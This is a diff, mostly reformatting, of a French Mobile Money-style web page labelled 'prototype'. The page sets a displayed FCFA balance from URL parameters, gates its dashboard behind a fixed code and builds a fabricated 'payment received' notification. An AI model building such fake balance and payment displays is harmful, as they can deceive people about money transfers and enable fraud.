@@ -480,8 +480,13 @@ body{
 }
 
 @keyframes rotation{
-    from{transform:rotate(0deg);}
-    to{transform:rotate(360deg);}
+    from{
+        transform:rotate(0deg);
+    }
+
+    to{
+        transform:rotate(360deg);
+    }
 }
 </style>
 </head>
@@ -492,13 +497,19 @@ body{
      NOTIFICATION PROTOTYPE
 ========================= -->
 
-<div class="prototype-notification" id="prototypeNotification">
+<div
+    class="prototype-notification"
+    id="prototypeNotification"
+>
 
     <div class="notification-label">
         PROTOTYPE
     </div>
 
-    <div class="notification-text" id="notificationText"></div>
+    <div
+        class="notification-text"
+        id="notificationText"
+    ></div>
 
 </div>
 
@@ -507,7 +518,10 @@ body{
      MESSAGE INITIAL
 ========================= -->
 
-<div class="access-message" id="messageScreen">
+<div
+    class="access-message"
+    id="messageScreen"
+>
 
     <div class="message-box">
 
@@ -520,10 +534,15 @@ body{
         </div>
 
         <div class="message-text">
-            Vous souhaitez réellement retirer l'argent
-            de votre compte sur votre numéro Mobile Money ?
+
+            Vous souhaitez réellement retirer
+            l'argent de votre compte sur votre
+            numéro Mobile Money ?
+
             <br><br>
+
             Veuillez confirmer pour continuer.
+
         </div>
 
         <button
@@ -543,7 +562,10 @@ body{
      CODE
 ========================= -->
 
-<div class="code-screen" id="codeScreen">
+<div
+    class="code-screen"
+    id="codeScreen"
+>
 
     <div class="code-box">
 
@@ -556,8 +578,11 @@ body{
         </div>
 
         <div class="code-text">
+
             Veuillez saisir votre code d'accès
-            de démonstration pour accéder à votre espace.
+            de démonstration pour accéder à
+            votre espace.
+
         </div>
 
         <input
@@ -577,7 +602,10 @@ body{
             ACCÉDER
         </button>
 
-        <div class="code-error" id="codeError">
+        <div
+            class="code-error"
+            id="codeError"
+        >
             Code incorrect. Veuillez réessayer.
         </div>
 
@@ -590,24 +618,43 @@ body{
      TABLEAU
 ========================= -->
 
-<div class="dashboard" id="dashboard">
+<div
+    class="dashboard"
+    id="dashboard"
+>
 
-    <div class="amount-box" id="mainCard">
+    <div
+        class="amount-box"
+        id="mainCard"
+    >
 
         <div class="prototype">
             PROTOTYPE
         </div>
 
-        <div class="person-name" id="personName">
+        <div
+            class="person-name"
+            id="personName"
+        >
             Nom de la personne
         </div>
 
         <div class="amount-label">
-            <span>Solde disponible</span>
-            <span>👁</span>
+
+            <span>
+                Solde disponible
+            </span>
+
+            <span>
+                👁
+            </span>
+
         </div>
 
-        <div class="amount" id="amount">
+        <div
+            class="amount"
+            id="amount"
+        >
             0 FCFA
         </div>
 
@@ -632,7 +679,10 @@ body{
     </div>
 
 
-    <div class="stats" id="stats">
+    <div
+        class="stats"
+        id="stats"
+    >
 
         <div class="stat">
 
@@ -817,19 +867,24 @@ body{
    PARAMÈTRES URL
 ========================= */
 
-const params = new URLSearchParams(
-    window.location.search
-);
+const params =
+    new URLSearchParams(
+        window.location.search
+    );
 
-const nom = params.get("nom");
-const montant = params.get("montant");
+const nom =
+    params.get("nom");
+
+const montant =
+    params.get("montant");
 
 
 /* =========================
    NUMÉRO PRIVILÉGIÉ
 ========================= */
 
-const MON_NUMERO = "98197883";
+const MON_NUMERO =
+    "98197883";
 
 
 /* =========================
@@ -840,14 +895,18 @@ let montantInitial = 0;
 
 if(montant){
 
-    const nombre = Number(
-        montant
-            .replace(/\s/g,"")
-            .replace(/[^\d.-]/g,"")
-    );
+    const nombre =
+        Number(
+            montant
+                .replace(/\s/g,"")
+                .replace(/[^\d.-]/g,"")
+        );
 
     if(!isNaN(nombre)){
-        montantInitial = nombre;
+
+        montantInitial =
+            nombre;
+
     }
 
 }
@@ -872,10 +931,14 @@ if(nom){
 
 function afficherMontant(valeur){
 
-    document.getElementById(
-        "amount"
-    ).textContent =
-        Number(valeur).toLocaleString("fr-FR")
+    const element =
+        document.getElementById(
+            "amount"
+        );
+
+    element.textContent =
+        Number(valeur)
+            .toLocaleString("fr-FR")
         + " FCFA";
 
 }
@@ -887,7 +950,10 @@ function afficherMontant(valeur){
 
 function normaliserNumero(numero){
 
-    return numero.replace(/\D/g,"");
+    return numero.replace(
+        /\D/g,
+        ""
+    );
 
 }
 
@@ -898,8 +964,10 @@ function normaliserNumero(numero){
 
 function getSoldeKey(numero){
 
-    return "prototype_solde_" +
-        normaliserNumero(numero);
+    return (
+        "prototype_solde_" +
+        normaliserNumero(numero)
+    );
 
 }
 
@@ -916,7 +984,9 @@ function actualiserSolde(numero){
 
     if(!numeroNormalise){
 
-        afficherMontant(montantInitial);
+        afficherMontant(
+            montantInitial
+        );
 
         return;
 
@@ -924,13 +994,19 @@ function actualiserSolde(numero){
 
 
     /*
-     * Le numéro 98197883 conserve
-     * toujours le montant initial.
+     * Le numéro 98197883
+     * conserve toujours le
+     * montant initial.
      */
 
-    if(numeroNormalise === MON_NUMERO){
+    if(
+        numeroNormalise ===
+        MON_NUMERO
+    ){
 
-        afficherMontant(montantInitial);
+        afficherMontant(
+            montantInitial
+        );
 
         return;
 
@@ -939,7 +1015,9 @@ function actualiserSolde(numero){
 
     const sauvegarde =
         localStorage.getItem(
-            getSoldeKey(numeroNormalise)
+            getSoldeKey(
+                numeroNormalise
+            )
         );
 
 
@@ -948,13 +1026,18 @@ function actualiserSolde(numero){
         const valeur =
             Number(sauvegarde);
 
+
         afficherMontant(
-            isNaN(valeur) ? 0 : valeur
+            isNaN(valeur)
+                ? 0
+                : valeur
         );
 
     }else{
 
-        afficherMontant(montantInitial);
+        afficherMontant(
+            montantInitial
+        );
 
     }
 
@@ -965,7 +1048,9 @@ function actualiserSolde(numero){
    MONTANT AU DÉPART
 ========================= */
 
-afficherMontant(montantInitial);
+afficherMontant(
+    montantInitial
+);
 
 
 /* =========================
@@ -988,29 +1073,38 @@ const continueBtn =
     );
 
 
-/*
- * VERSION ROBUSTE DU BOUTON
- * CONTINUER
- */
+/* =========================
+   BOUTON CONTINUER
+========================= */
 
-continueBtn.onclick = function(){
+continueBtn.onclick =
+    function(){
 
-    messageScreen.style.display = "none";
+        messageScreen.style.display =
+            "none";
 
-    codeScreen.classList.add("show");
 
-    const champCode =
-        document.getElementById(
-            "accessCode"
+        codeScreen.classList.add(
+            "show"
         );
 
-    setTimeout(function(){
 
-        champCode.focus();
+        const champCode =
+            document.getElementById(
+                "accessCode"
+            );
 
-    },100);
 
-};
+        setTimeout(
+            function(){
+
+                champCode.focus();
+
+            },
+            100
+        );
+
+    };
 
 
 /* =========================
@@ -1040,21 +1134,34 @@ const dashboard =
 
 function verifyCode(){
 
-    if(accessCode.value === "63633"){
+    if(
+        accessCode.value ===
+        "63633"
+    ){
 
-        codeScreen.classList.remove("show");
+        codeScreen.classList.remove(
+            "show"
+        );
 
-        dashboard.style.display = "block";
 
-        codeError.style.display = "none";
+        dashboard.style.display =
+            "block";
+
+
+        codeError.style.display =
+            "none";
+
 
         accessCode.value = "";
 
     }else{
 
-        codeError.style.display = "block";
+        codeError.style.display =
+            "block";
+
 
         accessCode.value = "";
+
 
         accessCode.focus();
 
@@ -1063,18 +1170,20 @@ function verifyCode(){
 }
 
 
-codeBtn.onclick = verifyCode;
+codeBtn.onclick =
+    verifyCode;
 
 
-accessCode.onkeydown = function(event){
+accessCode.onkeydown =
+    function(event){
 
-    if(event.key === "Enter"){
+        if(event.key === "Enter"){
 
-        verifyCode();
+            verifyCode();
 
-    }
+        }
 
-};
+    };
 
 
 /* =========================
@@ -1095,9 +1204,13 @@ const dernierNumero =
 
 if(dernierNumero){
 
-    phone.value = dernierNumero;
+    phone.value =
+        dernierNumero;
 
-    actualiserSolde(dernierNumero);
+
+    actualiserSolde(
+        dernierNumero
+    );
 
 }
 
@@ -1117,7 +1230,10 @@ phone.addEventListener(
                 numero
             );
 
-            actualiserSolde(numero);
+
+            actualiserSolde(
+                numero
+            );
 
         }else{
 
@@ -1149,28 +1265,29 @@ const selectedNetwork =
 networkButtons.forEach(
     function(button){
 
-        button.onclick = function(){
+        button.onclick =
+            function(){
 
-            networkButtons.forEach(
-                function(item){
+                networkButtons.forEach(
+                    function(item){
 
-                    item.classList.remove(
-                        "selected"
-                    );
+                        item.classList.remove(
+                            "selected"
+                        );
 
-                }
-            );
-
-
-            button.classList.add(
-                "selected"
-            );
+                    }
+                );
 
 
-            selectedNetwork.textContent =
-                button.dataset.network;
+                button.classList.add(
+                    "selected"
+                );
 
-        };
+
+                selectedNetwork.textContent =
+                    button.dataset.network;
+
+            };
 
     }
 );
@@ -1183,69 +1300,4 @@ networkButtons.forEach(
 function afficherNotification(){
 
     const montantActuel =
-        document.getElementById(
-            "amount"
-        ).textContent;
-
-
-    const numero =
-        phone.value.trim();
-
-
-    const maintenant =
-        new Date();
-
-
-    const date =
-        maintenant.toLocaleDateString(
-            "fr-FR"
-        );
-
-
-    const heure =
-        maintenant.toLocaleTimeString(
-            "fr-FR",
-            {
-                hour:"2-digit",
-                minute:"2-digit"
-            }
-        );
-
-
-    document.getElementById(
-        "notificationText"
-    ).innerHTML =
-
-        "Vous avez reçu <strong>" +
-        montantActuel +
-        "</strong><br>" +
-
-        "De Google TV (774886854)<br>" +
-
-        date +
-        " à " +
-        heure +
-
-        " sur votre numéro " +
-        numero +
-
-        "<br>" +
-
-        "Nouveau solde :";
-
-
-    const notification =
-        document.getElementById(
-            "prototypeNotification"
-        );
-
-
-    notification.classList.add(
-        "show"
-    );
-
-
-    setTimeout(
-        function(){
-
-            notification.classList.
+    
